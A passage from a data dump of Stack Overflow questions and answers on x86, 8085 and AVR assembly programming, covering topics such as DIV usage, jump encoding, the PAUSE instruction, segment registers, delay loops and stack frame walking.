MSGB DB 13,10,""Input second number:"",""$""
MSGC DB 13,10,""The quotient is: "",""$""
MSGD DB 13,10,""The modulo is: "",""$""

NUM1 db ?
NUM2 db ?

.CODE

MAIN PROC NEAR

MOV AX, @DATA
MOV DS, AX

; get first number
LEA DX, MSGA
MOV AH, 09h
INT 21h

MOV AH, 01
INT 21H
SUB AL, '0'

MOV BL, AL

; get second number
LEA DX, MSGB
MOV AH, 09h
INT 21h

MOV AH, 01
INT 21H
SUB AL, '0'

MOV CL, AL
MOV AL, BL

; divide
DIV CL
MOV NUM1, AL
ADD NUM1, '0'
MOV NUM2, AH
ADD NUM2, '0'

; output quotient
LEA DX, MSGC
MOV AH, 09h
INT 21h

MOV DL, NUM1
MOV AH, 02H
INT 21h

; output remainder/modulo
LEA DX, MSGD
MOV AH, 09h
INT 21h

MOV DL, NUM2
MOV AH, 02H
INT 21h

MOV AH, 4Ch
INT 21h

MAIN ENDP
END MAIN
</code></pre>

<p>I am new to Assembly language and I'm getting a problem with the DIV operation.</p>

<p>This should output the quotient and remainder if a 1-digit number is divided to a 1-digit number. What is wrong with my code?</p>
","<p>8-bit division using <code>DIV</code> instruction requires <code>AX</code> for dividend and an operand for the divisor.</p>

<p>I've corrected the division part of the code and the stack size. Stack size should be at least 1000, or your program might crash due to insufficient stack storage. Below is the code.</p>

<pre><code>.MODEL SMALL
.STACK 2000
.DATA

MSGA DB 13,10,""Input first number: "",""$""
MSGB DB 13,10,""Input second number: "",""$""
MSGC DB 13,10,""The quotient is: "",""$""
MSGD DB 13,10,""The modulo is: "",""$""

NUM1 db ?
NUM2 db ?

.CODE

MAIN PROC NEAR

MOV AX, @DATA
MOV DS, AX

; get first number
LEA DX, MSGA
MOV AH, 09h
INT 21h

MOV AH, 01
INT 21H
SUB AL, '0'

MOV BL, AL

; get second number
LEA DX, MSGB
MOV AH, 09h
INT 21h

MOV AH, 01
INT 21H
SUB AL, '0'

MOV CL, AL

; divide
MOV AH, 0 ; prepare dividend
MOV AL, BL
DIV CL
MOV NUM1, AL
ADD NUM1, '0'
MOV NUM2, AH
ADD NUM2, '0'

; output quotient
LEA DX, MSGC
MOV AH, 09h
INT 21h

MOV DL, NUM1
MOV AH, 02H
INT 21h

; output remainder/modulo
LEA DX, MSGD
MOV AH, 09h
INT 21h

MOV DL, NUM2
MOV AH, 02H
INT 21h

MOV AH, 4Ch
INT 21h

MAIN ENDP
END MAIN
</code></pre>
","11546389"
"How encode a relative short jmp in x86","20417","","<p>Suppose I want to do a short jump using the following opcodes:</p>

<blockquote>
  <p><strong>EB</strong> <em>CB</em>  or  <em>JMP rel8</em></p>
  
  <p>""Jump short, RIP = RIP + 8-bit displacement sign
  extended to 64-bits""</p>
  
  <p>(where CB is a byte <strong>signed value</strong> representing the relative offset relating to direction in <strong>EIP</strong> register)</p>
</blockquote>

<p>Maybe always the offset will be <em>offset+2</em> because the EIP in execution time (the reference direction) in this short jump is the base of the twobyte instruction, but the addend <a href=""http://onlinedisassembler.com/odaweb/run_hex"">occurs always</a> </p>

<blockquote>
  <p>eb 30 = jmp 0x00000032 (+30)</p>
  
  <p>eb e2 = jmp 0xffffffe4 (-30)</p>
  
  <p>then EIP can be intentionally the same direction because fe + 2 is <strong>00</strong> or <strong>EIP</strong>. </p>
  
  <p>eb fe = jmp 0x00000000</p>
</blockquote>

<p>I find it surprising that the <em>overoffset</em> ocurred bifurcated although the number is negative. But in the Intel I find no mention (maybe because 3000 pages).</p>

<blockquote>
  <p><strong>Intel® 64 and IA-32 Architectures
  Software Developer’s Manual: Vol. 2A 3-423</strong></p>
  
  <blockquote>
    <p>A near jump where the jump range is limited to –128 to +127 <strong>from the current</strong> EIP value.</p>
  </blockquote>
</blockquote>

<p>Then I contemplate three possibilities:</p>

<ol>
<li>is +2 because is the <em>after/future value</em> of EIP in execution time</li>
<li>The coded value is not a 2s component encoded signed number.</li>
<li>this appears in the manual but I have not seen because i'm stupid</li>
</ol>
","<p>The <code>rel8</code> is relative to the next instruction's memory address, as can easily be confirmed by creating two executables and disassembling them:</p>

<pre><code>@label:
    jmp @label
    nop
</code></pre>

<p>This disassembles as (with ndisasm, it's the same in 16-bit, 32-bit and 64-bit code):</p>

<pre><code>EBFE jmp short 0x0
90   nop
</code></pre>

<p>Then, another executable:</p>

<pre><code>    jmp @label
@label:
    nop

EB00 jmp short 0x2
90   nop
</code></pre>

<p>So, the <code>rel8</code> is encoded always relative to the next instruction after <code>jmp</code>. Disassemblers (at least<code>ndisasm</code> and <code>udcli</code>), however, show it relative to the <code>jmp</code> instruction itself. That may possibly cause some confusion.</p>
","14893159"
"Why is x86 ugly? Why is it considered inferior when compared to others?","20292","","<p>Recently I've been reading some SO archives and encountered statements against the x86 architecture. </p>

<ul>
<li><p><a href=""https://stackoverflow.com/questions/2667256"">Why do we need different CPU architecture for server &amp; mini/mainframe &amp; mixed-core?</a> says<br>
""<em>PC architecture is a mess, any OS developer would tell you that.</em>""</p></li>
<li><p><a href=""https://stackoverflow.com/questions/82432""><strike>Is learning Assembly Language worth the effort?</strike></a> (<a href=""https://web.archive.org/web/20130801000534/https://stackoverflow.com/questions/82432/is-learning-assembly-language-worth-the-effort"" rel=""nofollow noreferrer"">archived</a>) says<br>
""<em>Realize that the x86 architecture is horrible at best</em>""</p></li>
<li><p><a href=""http://forums.anandtech.com/showthread.php?t=976577"" rel=""nofollow noreferrer"">Any easy way to learn x86 assembler?</a> says<br>
""<em>Most colleges teach assembly on something like MIPS because it's much simpler to understand, x86 assembly is really ugly</em>""</p></li>
</ul>

<p>and many more comments like</p>

<ul>
<li><p><a href=""https://news.ycombinator.com/item?id=276418"" rel=""nofollow noreferrer""><em>""Compared to most architectures, X86 sucks pretty badly.""</em></a></p></li>
<li><p><a href=""https://news.ycombinator.com/item?id=276459"" rel=""nofollow noreferrer"">""<em>It's definitely the conventional wisdom that X86 is inferior to MIPS, SPARC, and PowerPC</em>""</a></p></li>
<li><p><a href=""https://news.ycombinator.com/item?id=276471"" rel=""nofollow noreferrer"">""<em>x86 is ugly</em>""</a></p></li>
</ul>

<p>I tried searching but didn't find any reasons. I don't find x86 bad probably because this is the only architecture I'm familiar with.</p>

<p>Can someone kindly give me reasons for considering x86 ugly/bad/inferior compared to others.</p>
","<p>Couple of possible reasons for it:</p>

<ol>
<li>x86 is a relatively old <a href=""https://en.wikipedia.org/wiki/Instruction_set"" rel=""nofollow noreferrer"">ISA</a> (its progenitors were 8086s, after all)</li>
<li>x86 has evolved significantly several times, but hardware is required to maintain backwards compatibility with old binaries. For example, modern x86 hardware still contains support for running 16 bit code natively. Additionally, several memory-addressing models exist to allow older code to inter-operate on the same processor, such as real mode, protected mode, virtual 8086 mode, and (amd64) long mode. This can be confusing to some.</li>
<li>x86 is a CISC machine. For a long time this meant it was slower than RISC machines like MIPS or ARM, because instructions have <a href=""https://stackoverflow.com/a/2680041/82320"">data interdependency and flags</a> making most forms of instruction level parallelism difficult to implement. Modern implementations translate the x86 instructions into RISC-like instructions called ""<a href=""https://en.wikipedia.org/wiki/Micro-operation"" rel=""nofollow noreferrer"">micro-ops</a>"" under the covers to make these kinds of optimizations practical to implement in hardware.</li>
<li>In some respects, the x86 isn't inferior, it's just different. For example, input/output is handled as memory mapping on the vast majority of architectures, but not on the x86. (NB: Modern x86 machines typically have some form of <a href=""https://en.wikipedia.org/wiki/Direct_memory_access"" rel=""nofollow noreferrer"">DMA</a> support, and communicate with other hardware through memory mapping; but the <a href=""https://en.wikipedia.org/wiki/Instruction_set"" rel=""nofollow noreferrer"">ISA</a> still has I/O instructions like <code>IN</code> and <code>OUT</code>)</li>
<li>The x86 <a href=""https://en.wikipedia.org/wiki/Instruction_set"" rel=""nofollow noreferrer"">ISA</a> has a very few architectural registers, which can force programs to round-trip through memory more frequently than would otherwise be necessary.  The extra instructions needed to do this take execution resources that could be spent on useful work, although <a href=""https://en.wikipedia.org/wiki/Memory_disambiguation#Store_to_load_forwarding"" rel=""nofollow noreferrer"">efficient store-forwarding</a> keeps the latency low.  Modern implementations with register renaming onto a large physical register file can keep many instructions in flight, but lack of architectural registers was still a significant weakness for 32-bit x86.  x86-64's increase from 8 to 16 integer and vector registers is one of the biggest factors in 64bit code being faster than 32-bit (along with the more efficient register-call ABI), not the increased width of each register.  A further increase from 16 to 32 integer registers would help some, but not as much.  (AVX512 does increase to 32 vector registers, though, because floating-point code has higher latency and often needs more constants.)  (<a href=""https://stackoverflow.com/questions/2679882/why-is-x86-ugly-aka-why-is-x86-considered-inferior-when-compared-to-others/2679922?noredirect=1#comment56088321_2679922"">see comment</a>)</li>
<li><p>x86 assembly code is complicated because x86 is a complicated architecture with many features. An instruction listing for a typical MIPS machine fits on a single letter sized piece of paper. The equivalent listing for x86 fills several pages, and the instructions just do more, so you often need a bigger explanation of what they do than a listing can provide. For example, the <a href=""https://en.wikipedia.org/wiki/X86_instruction_listings#Original_8086.2F8088_instructions"" rel=""nofollow noreferrer""><code>MOVSB</code> instruction</a> needs a relatively large block of C code to describe what it does:</p>

<pre><code>if (DF==0) 
  *(byte*)DI++ = *(byte*)SI++; 
else 
  *(byte*)DI-- = *(byte*)SI--;
</code></pre>

<p>That's a single instruction doing a load, a store, and two adds or subtracts (controlled by a flag input), each of which would be separate instructions on a RISC machine.</p>

<p>While MIPS (and similar architectures) simplicity doesn't necessarily make them superior, for teaching an introduction to assembler class it makes sense to start with a simpler <a href=""https://en.wikipedia.org/wiki/Instruction_set"" rel=""nofollow noreferrer"">ISA</a>.  Some assembly classes teach an ultra-simplified subset of x86 called <a href=""https://esolangs.org/wiki/Y86"" rel=""nofollow noreferrer"">y86</a>, which is simplified beyond the point of not being useful for real use (e.g. no shift instructions), or some teach just the basic x86 instructions.</p></li>
<li>The x86 uses variable-length opcodes, which add hardware complexity with respect to the parsing of instructions. In the modern era this cost is becoming vanishingly small as CPUs become more and more limited by memory bandwidth than by raw computation, but many ""x86 bashing"" articles and attitudes come from an era when this cost was comparatively much larger.<br>
Update 2016: Anandtech has posted a <a href=""http://www.anandtech.com/show/9766/the-apple-ipad-pro-review/3"" rel=""nofollow noreferrer"">discussion regarding opcode sizes under x64 and AArch64</a>.</li>
</ol>

<hr>

<p>EDIT: This is not supposed to be a <em>bash the x86!</em> party. I had little choice but to do some amount of bashing given the way the question's worded. But with the exception of (1), all these things were done for good reasons (see comments). Intel designers aren't stupid -- they wanted to achieve some things with their architecture, and these are some of the taxes they had to pay to make those things a reality.</p>
","2679922"
"What does ""rep; nop;"" mean in x86 assembly? Is it the same as the ""pause"" instruction?","20251","","<ul>
<li>What does <code>rep; nop</code> mean?</li>
<li>Is it the same as <code>pause</code> instruction?</li>
<li>Is it the same as <code>rep nop</code> (without the semi-colon)?</li>
<li>What's the difference to the simple <code>nop</code> instruction?</li>
<li>Does it behave differently on AMD and Intel processors?</li>
<li>(bonus) Where is the official documentation for these instructions?</li>
</ul>

<hr>

<h3>Motivation for this question</h3>

<p>After some discussion in the comments of <a href=""https://stackoverflow.com/questions/7083482/how-to-prevent-compiler-optimization-on-a-small-piece-of-code"">another question</a>, I realized that I don't know what <code>rep; nop;</code> means in x86 (or x86-64) assembly. And also I couldn't find a good explanation on the web.</p>

<p>I know that <code>rep</code> is a prefix that means <em>""repeat the next instruction <code>cx</code> times""</em> (or at least it was, in old 16-bit x86 assembly). According to this <a href=""http://en.wikipedia.org/wiki/X86_instruction_listings#Original_8086.2F8088_instructions"" rel=""nofollow noreferrer"">summary table at Wikipedia</a>, it seems <code>rep</code> can only be used with <code>movs</code>, <code>stos</code>, <code>cmps</code>, <code>lods</code>, <code>scas</code> (but maybe this limitation was removed on newer processors). Thus, I would think <code>rep nop</code> (without semi-colon) would repeat a <code>nop</code> operation <code>cx</code> times.</p>

<p>However, after further searching, I got even more confused. It seems that <code>rep; nop</code> and <code>pause</code> <a href=""https://stackoverflow.com/questions/2589447/is-it-necessary-that-each-machine-code-can-only-map-to-one-assembly-code/2589462#2589462"">map to the exactly same opcode</a>, and <code>pause</code> has a bit different behavior than just <code>nop</code>. Some <a href=""http://www.x86-64.org/pipermail/discuss/2005-March/005800.html"" rel=""nofollow noreferrer"">old mail from 2005</a> said different things:</p>

<ul>
<li><em>""try not to burn too much power""</em></li>
<li><em>""it is equivalent to 'nop' just with 2 byte encoding.""</em></li>
<li><em>""it is magic on intel. Its like 'nop but let the other HT sibling run'""</em></li>
<li><em>""it is pause on intel and fast padding on Athlon""</em></li>
</ul>

<p>With these different opinions, I couldn't understand the correct meaning.</p>

<p>It's being used in Linux kernel (on both <a href=""http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/arch/um/sys-i386/asm/processor.h#L53"" rel=""nofollow noreferrer"">i386</a> and <a href=""http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/arch/um/sys-x86_64/asm/processor.h#L20"" rel=""nofollow noreferrer"">x86_64</a>), together with this comment: <code>/* REP NOP (PAUSE) is a good thing to insert into busy-wait loops. */</code> It is also <a href=""http://doc.bertos.org/2.6/attr_8h_source.html#l00096"" rel=""nofollow noreferrer"">being used in BeRTOS</a>, with the same comment.</p>
","<p><code>rep; nop</code> is indeed the same as the <code>pause</code> instruction (opcode <code>F390</code>). It might be used for assemblers which don't support the <code>pause</code> instruction yet. On previous processors, this simply did nothing, just like <code>nop</code> but in two bytes. On new processors which support hyperthreading, it is used as a hint to the processor that you are executing a spinloop to increase performance. From <a href=""http://www.intel.com/Assets/PDF/manual/325383.pdf"" rel=""nofollow noreferrer"">Intel's instruction reference</a>:</p>

<blockquote>
  <p>Improves the performance of spin-wait loops. When executing a “spin-wait loop,” a Pentium 4 or Intel Xeon processor suffers a severe performance penalty when exiting the loop because it detects a possible memory order violation. The PAUSE instruction provides a hint to the processor that the code sequence is a spin-wait loop. The processor uses this hint to avoid the memory order violation in most situations, which greatly improves processor performance. For this reason, it is recommended that a PAUSE instruction be placed in all spin-wait loops.</p>
</blockquote>
","7086289"
"How to check if a signed integer is neg or pos?","20161","","<p>I am new to x86 assembly language, I have a signed integer saved in register <code>eax</code>, and I want to check if the number is negative or positive. To do that, I used <code>bt</code> instruction to check the first bit. </p>

<p>Here is what I did:</p>

<pre><code>bt eax,0
jnc isNegative
</code></pre>

<p><code>bt</code> carries the first bit to carry flag, and I used <code>jnc</code> to check if carry flag is 0 or 1. 
If it's 1, it should be a negative number, and does negative instructions...
however, the output is unpredictable, sometimes I have a positive and it recognize it as a negative number. Am I doing something wrong?</p>

<p>EDIT: I just realized it could have something to do with endianess. It is actually checking the last bit instead of the first bit. Let me try use <code>bt</code>, 7</p>
","<p>The value is negative if the MSB is set. It can be checked with </p>

<pre><code>test eax, 0x80000000
jne is_signed
</code></pre>

<p>or, simplier:</p>

<pre><code>test eax, eax
js signed
</code></pre>

<p>or for byte case:</p>

<pre><code>test al, al
js is_signed
; or
test eax, 80h
jne is_signed
</code></pre>
","4017455"
"Assembly: Using the Data Segment Register (DS)","20151","","<p>Currently I am in the midst of learning x86 assembly for fun, I'm love microcontroller programming, so I'm familiar with assembly.</p>

<p>Currently I've been searching high and low for the answer to this question, but can't seem to find it... the DS register, I know it's supposed to point to the global data in my program, but I don't know how it works exactly. I'm using NASM, and in most simple programs I see the following:</p>

<pre>
[org 0x7C00]
[bits 16]  

main:
<b>mov ax, 0x0000
mov ds, ax</b>
mov al, [msg]  
mov ah, 0x0E  
mov bx, 0x0007  
int 0x10    
jmp $  

msg db 'X'

times 510-($-$$) db 0  
dw 0xAA55
</pre>

<p>and that works perfectly (even if I omit the bolded code), but how? Does the CPU automagically load the global variables starting at 0x0000? or is there something intrinsic here that I'm missing?</p>
","<p>When the computer is under real mode (the mode the CPU is at when the BIOS executes the bootloader), the method the CPU uses to calculate the address is very simple: Multiply segment register value by 16 (shift bits 4 positions to left), then add the offset.</p>

<p>For instance in an instruction like ""mov ax, [0x1234]"" the CPU would use ""DS * 0x10 + 0x1234"" as the effective address (the first term resolves to zero in your case.) When you have one like ""mov ax, [BP+0x32]"" then the CPU will use ""SS * 0x10 + BP + 0x32"". Note that now the CPU used a different segment register (the Stack Segment), and that is because when the BP register is used, the CPU assumes you wan't to access the stack by default (but you can override this by using [DS:BP + 0x32]).</p>

<p>More o less what I've explained and more can be found at <a href=""http://wiki.osdev.org/Real_Mode"" rel=""noreferrer"">http://wiki.osdev.org/Real_Mode</a> and <a href=""http://www.internals.com/articles/protmode/realmode.htm"" rel=""noreferrer"">http://www.internals.com/articles/protmode/realmode.htm</a> and lots of more places.</p>

<p>BTW, ""msg"" should be located more or less at 0x7C11 address.</p>
","4904472"
"an 8085 assembly language program to find the factorial of a number","20138","","<p>i want to find factorial a number which i take memory first.(intel 8085)</p>

<p>edit: i'm beginner. i don't know how to write it's assembly codes. </p>

<p>pseudo code:</p>

<pre><code>input n
fact = 1
loop:
..multiply fact by n
..decrement n
..test n
..jump if not zero to loop
output fact
</code></pre>
","<p>In the first place, you'd better learn how to write 8085 if you expect to use it.  Assembler, especially for old 8-bit microprocessors, is not something you can just take canned software and patch in.</p>

<p>In the second place, exactly what are you using for numbers?  The 8085 has an 8-bit bus and can use registers as 16 bits.  If you're limited to 16-bit numbers, you can use a lookup table, as you can't represent 9! anyway.</p>

<p>In the third place, if you're doing it the algorithmic way, you might want to first look into what you're using for multiplication.  The 8085 does not have on-chip multiplication.  (I once won a contest for multiple-precision multiplication and division using the Z80, which had some features the 8085 didn't have.  In particular, I was able to use the alternate register bank to do some useful stuff.)</p>
","2455868"
"Writing firmware: assembly or high level?","20138","","<p>Related to:</p>

<ul>
<li><a href=""https://stackoverflow.com/questions/451984/testing-firmware"">Testing firmware</a>  </li>
<li><a href=""https://stackoverflow.com/questions/448513/starting-a-microcontroller-simulator-emulator"">starting a microcontroller simulator/emulator</a> </li>
<li><a href=""https://stackoverflow.com/questions/448580/interpreting-assembly-code"">Interpreting assembly code</a></li>
</ul>

<p>If you are writing code for a <a href=""http://www.sparkfun.com/commerce/product_info.php?products_id=707#"" rel=""nofollow noreferrer"">microcontroller</a> is there a real difference if you write in assembly or C or some other high level language? If you wrote C code, how would you compile it? </p>

<p>Thanks</p>
","<p>Several comments:</p>

<p>1) Absolutely <strong>not</strong> assembly unless performance or optimization constraints warrant it. The following metrics go through the roof with assembly:</p>

<ul>
<li>time to code it</li>
<li>time to debug it</li>
<li>time to test it</li>
<li>time to document it</li>
<li>time to figure out (1 year later) what it was you were doing when you coded it</li>
<li>chances of making a mistake</li>
</ul>

<p>2) My preference would be C++ rather than C for its namespace encapsulation &amp; its facilitation of <em>compile-time</em> object-oriented practices. C has too many opportunities for global variables and namespace collisions. (Real-time Java would be nice but from what I understand its requirements are still pretty high) </p>

<p>Or rather a subset of C++: Exclude exceptions, virtual functions, run-time type identification, also dynamic memory allocation in most cases -- basically anything that's left unspecified at compile time, as it will usually require a lot of extra resources during runtime. That's the ""bloat"" of C++.</p>

<p>I have used both TI's and IAR's compilers for C++, for the TMS320 and MSP430 microcontrollers (respectively) and with proper optimization settings, they do a fantastic job of reducing the overhead you might expect from C++. (Especially if you help it out by judicious use of the <code>inline</code> keyword) </p>

<p>I have even used templates for some of their compile-time benefits which promote good code reuse: e.g. writing a single source code file to handle 8-bit, 16-bit, and 32-bit CRCs; and <a href=""http://en.wikipedia.org/wiki/Curiously_Recurring_Template_Pattern"" rel=""noreferrer"">compile-time polymorphism</a> to allow you to specify the usual behavior of a class, and then reuse that but override some of its functions. Again, the TI compiler had an extremely low overhead with appropriate optimization settings.</p>

<p>I have been looking for a C++ compiler for the Microchip PICs; the only company I've found that produces one is IAR. ($$$ has been an obstacle but I hope to buy a copy sometime) The Microchip C18/C30 compilers are pretty good but they're C, not C++.</p>

<p>3) A specific caveat about compiler optimization: it can/will make debugging very difficult; often it's impossible to single-step through optimized C/C++ code and your watch windows may show variables that have no correlation with what you think they should contain with unoptimized code. (A good debugger would warn you that a particular variable has been optimized out of existence or into a register rather than a memory location. Many debuggers do not. >:( </p>

<p>Also a good compiler would let you pick/choose optimization at the function level through #pragmas. The ones I've used only let you specify optimization at the file level.</p>

<p>4) Interfacing C code to assembly: This is usually difficult. The easiest way is to make a stub function that has the signature you want e.g. <code>uint16_t foo(uint16_t a, uint32_t b) {return 0; }</code>, where <code>uint16_t</code> = unsigned short, we usually make the # of bits explicit. Then compile it and edit the assembly it produces (just make sure to leave the begin/exit parts of the code) and <strong>be careful</strong> not to clobber any registers without restoring them after you are done.</p>

<p>Inline assembly usually can have problems unless you are doing something <em>very</em> simple like enabling/disabling interrupts.</p>

<p>The approach I like best is compiler intrinsics / ""extended ASM"" syntax. Microchip's C compiler is based on the GNU C compiler and it has ""<a href=""http://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html"" rel=""noreferrer"">extended ASM</a>"" which lets you code bits of inline assembly but you can give it lots of hints to tell it which registers/variables you are referencing and it will handle all the saving/restoring of registers to make sure your assembly code ""plays nice"" with C. TI's compiler for the TMS320 DSP doesn't support these; it does have a limited set of intrinsics which have some use.</p>

<p>I've used assembly to optimize some control loop code that got executed frequently, or to calculate sin(), cos(), and arctan(). But otherwise I'd stay away from assembly and stick with a high-level language.</p>
","452401"
"Easy way to convert c code to x86 assembly?","20136","","<p>Is there an easy way (like a free program) that can covert c/c++ code to x86 assembly?</p>

<p>I know that any c compiler does something very similar and that I can just compile the c code and then disassemble the complied executable, but that's kind of an overkill, all I want is to convert a few lines of code.</p>

<p>Does anyone know of some program that can do that?</p>

<p>EDIT: I know that GCC compiler does that but it's AT&amp;T syntax and I'm looking for the Intel syntax (not sure if it's called intel syntax or not). The AT&amp;T syntax looks a bit like gibberish to me and some commands use operands in reverse order and not how I'm used to and it can get really confusing.</p>
","<p>Gcc can do it with the -S switch, but it will be disgustingly ugly at&amp;t syntax.</p>
","2709334"
"How to make a delay in assembly for avr microcontrollers?","20121","","<p>I am having a problem in calculating delays. I want to make a delay for <code>1 sec</code> when I am using <code>1MHz</code> clock speed for my atmega128 microcontroller.</p>

<p>I use proteus for simulation and avr studio for coding in assembly for atmel microcontroller.</p>

<p>For example this code is for <code>8MHz</code> clock microcontroller</p>

<pre><code>Delay_15mS:                 ; For CLK(CPU) = 8 MHz
    LDI     dly1,   120     ; One clock cycle;
Delay1:
    LDI     dly2,   250     ; One clock cycle
Delay2:
    DEC     dly2            ; One clock cycle
    NOP                     ; One clock cycle
    BRNE    Delay2          ; Two clock cycles for true 1 clock for false

    DEC     dly1            ; One clock Cycle
    BRNE    Delay1          ; Two clock cycles for true 1 clock for false
RET
</code></pre>

<p>Can you teach me how to calculate the time this delay will take? So I could make 1 for 1 sec delay @ 1 MHz</p>

<p>Thank you</p>
","<p>To calculate a delay, you need to calculate the cycle time and then count how may cycles you need to reach the wanted delay.</p>

<p>In your case, <code>1MHz</code> clock means <code>1000000</code> cycles per second. So <code>1</code> cycle equals <code>1/1000000</code> seconds or <code>1us</code>. To get 1 second delay, you need <code>1000000</code> cycles of <code>1us</code>, so it means that you have to create an algorithm of <code>1000000</code> cycles.</p>

<p>Building on your example, a <code>1</code> sec delay <code>@ 1MHz</code> clock would be:</p>

<pre><code>Delay_1sec:                 ; For CLK(CPU) = 1 MHz
    LDI     dly1,   8       ; One clock cycle;
Delay1:
    LDI     dly2,   125     ; One clock cycle
Delay2:
    LDI     dly3,   250     ; One clock cycle
Delay3:
    DEC     dly3            ; One clock cycle
    NOP                     ; One clock cycle
    BRNE    Delay3          ; Two clock cycles when jumping to Delay3, 1 clock when continuing to DEC

    DEC     dly2            ; One clock cycle
    BRNE    Delay2          ; Two clock cycles when jumping to Delay2, 1 clock when continuing to DEC

    DEC     dly1            ; One clock Cycle
    BRNE    Delay1          ; Two clock cycles when jumping to Delay1, 1 clock when continuing to RET
RET
</code></pre>

<p>In this case there is the internal loop <code>Delay3</code> that is <code>4</code> cycles long because <code>DEC=1</code>, <code>NOP=1</code> and <code>BRNE=2</code> when jumping to Delay3. So, <code>4</code> cycles repeated <code>250</code> times (the value of <code>dly3</code>) are <code>1000</code> cycles or <code>1000us</code> = <code>1ms</code>.</p>

<p>Then the loop <code>Delay2</code> repeats the <code>Delay3</code> <code>125</code> times (the value of <code>dly2</code>). So the accumulated delay in this case is <code>125ms</code>.</p>

<p>And finally, the loop <code>Delay1</code> repeats the <code>Delay2</code> <code>8</code> times (the value of <code>dly1</code>). So the accumulated delay in this case is <code>1000ms</code> or <code>1</code> second.  </p>

<p>NOTE: This example delay is actually a little bit longer than <code>1sec</code> because I didn't consider the time of the instructions of <code>Delay2</code> and <code>Delay1</code>. The influence is very small, but for a precise <code>1sec</code> delay, these instructions must be counted and the values of <code>dly1</code>, <code>dly2</code> and <code>dly3</code> must be adjusted to guarantee that the algorithm is exactly <code>1000000</code> cycles long.</p>

<p>NOTE2: With this algorithm the microcontroller can't do anything else while executing the delay because you are using it to count cycles. If you want to do other things while doing a delay, take a look at <a href=""https://www.newbiehack.com/TimersandCountersDefaultandBasicUsage.aspx"" rel=""nofollow"">timers</a> and interrupts of the microcontroller.</p>
","24207694"
"reverse engineering c programs","20023","","<p>every c program is converted to machine code, if this binary is distributed. Since the instruction set of a computer is well known, is it possible to get back the C original program?</p>
","<p>You can never get back to the exact same source since there is no meta-data about that saved with the compiled code.</p>

<p>But you can re-create code out from the assembly-code.</p>

<p>Check out this book if you are interested in these things: <a href=""http://rads.stackoverflow.com/amzn/click/0764574817"" rel=""noreferrer"">Reversing: Secrets of Reverse Engineering</a>.</p>

<p><strong>Edit</strong></p>

<p>Some compilers-101 here, if you were to define a compiler with another word and not as technical as ""compiler"", what would it be?</p>

<p>Answer: <strong>Translator</strong></p>

<p>A compiler translates the syntax / phrases you have written into another language a C compiler translates to Assembly or even Machine-code. C# Code is translated to IL and so forth.</p>

<p>The executable you have is just a translation of your original text / syntax and if you want to ""reverse it"" hence ""translate it back"" you will most likely not get the same structure as you had at the start.</p>

<p>A more real life example would be if you Translate from English to German and the from German back to English, the sentance structure will most likely be different, other words might be used but the meaning, the context, will most likely not have changed.</p>

<p>The same goes for a compiler / translator if you go from C to ASM, the logic is the same, it's just a different way of reading it ( and of course its optimized ).</p>
","2272595"
"How to get address of base stack pointer","19949","","<p>I am in the process of porting an application from x86 to x64. I am using Visual Studio 2009; most of the code is C++ and some portions are plain C. The __asm keyword is not supported when compiling towards x64 and our application contains a few portions of inline assembler. I did not write this code so I don't know exactly what et is supposed to do:</p>

<pre><code>int CallStackSize() {
    DWORD Frame;
    PDWORD pFrame;
    __asm
        {
            mov EAX, EBP
            mov Frame, EAX
        }
    pFrame = (PDWORD)Frame;
    /*... do stuff with pFrame here*/
}
</code></pre>

<p>EBP is the base pointer to the stack of the current function. Is there some way to obtain the stack pointer without using inline asm? I have been looking at the intrinsics that Microsoft offers as a substitute for inline asm but I could not find anything that gave me something usefull. Any ideas?</p>

<p>Andreas asked what stuff is done with pFrame. Here is the complete function:</p>

<pre><code>int CallStackSize(DWORD frameEBP = 0)
{
    DWORD pc;
    int tmpint = 0;
    DWORD Frame;
    PDWORD pFrame, pPrevFrame;

    if(!frameEBP) // No frame supplied. Use current.
    {
        __asm
        {
            mov EAX, EBP
            mov Frame, EAX
        }
    }
    else Frame = frameEBP;

    pFrame = (PDWORD)Frame;
    do
    {
        pc = pFrame[1];
        pPrevFrame = pFrame;
        pFrame = (PDWORD)pFrame[0]; // precede to next higher frame on stack

        if ((DWORD)pFrame &amp; 3) // Frame pointer must be aligned on a DWORD boundary. Bail if not so.
        break;

        if (pFrame &lt;= pPrevFrame)
        break;

        // Can two DWORDs be read from the supposed frame address?
        if(IsBadWritePtr(pFrame, sizeof(PVOID)*2))
        break;

        tmpint++;
    } while (true);
    return tmpint;
}
</code></pre>

<p>The variable pc is not used. It looks like this function walks down the stack until it fails. It assumes that it can't read outside the applications stack so when it fails it has measured the depth of the call stack. This code does not need to compile on _EVERY_SINGLE compiler out there. Just VS2009. The application does not need to run on EVERY_SINGLE computer out there. We have complete control of deployment since we install/configure it ourselves and deliver the whole thing to our customers.</p>
","<p>The really right thing to do would be to rewrite whatever this function does so that it does not require access to the actual frame pointer.  That is definitely bad behavior.</p>

<p>But, to do what you are looking for you should be able to do:</p>

<pre><code>int CallStackSize() {
    __int64 Frame = 0; /* MUST be the very first thing in the function */
    PDWORD pFrame;

    Frame++; /* make sure that Frame doesn't get optimized out */

    pFrame = (PDWORD)(&amp;Frame);
    /*... do stuff with pFrame here*/
}
</code></pre>

<p>The reason this works is that in C usually the first thing a function does is save off the location of the base pointer (ebp) before allocating local variables.  By creating a local variable (Frame) and then getting the address of if, we're really getting the address of the start of this function's stack frame.</p>

<p>Note: Some optimizations could cause the ""Frame"" variable to be removed.  Probably not, but be careful.</p>

<p>Second Note: Your original code and also this code manipulates the data pointed to by ""pFrame"" when ""pFrame"" itself is on the stack.  It is possible to overwrite pFrame here by accident and then you would have a bad pointer, and could get some weird behavior.  Be especially mindful of this when moving from x86 to x64, because pFrame is now 8 bytes instead of 4, so if your old ""do stuff with pFrame"" code was accounting for the size of Frame and pFrame before messing with memory, you'll need to account for the new, larger size.</p>
","1847109"
"Intel x86 Opcode Reference?","19943","","<p>What is a <em>relatively quick and easy</em> method of looking up what an arbitrary opcode means (say, <code>0xC8</code>) in x86?</p>

<p>The Intel Software Developer's manual isn't very fun to search through...</p>
","<p>Check <a href=""http://ref.x86asm.net/coder32.html"">this very complete table of x86 opcodes on x86asm.net</a>.</p>

<p>Just <code>CTRL+F</code> and you're done! Be sure to read the correct line tho, as <code>C8</code> for example may appear in several locations.</p>
","6401636"
"Difference between rdtscp, rdtsc : memory and cpuid / rdtsc?","19897","","<p>Assume we're trying to use the tsc for performance monitoring and we we want to prevent instruction reordering.</p>

<p>These are our options: </p>

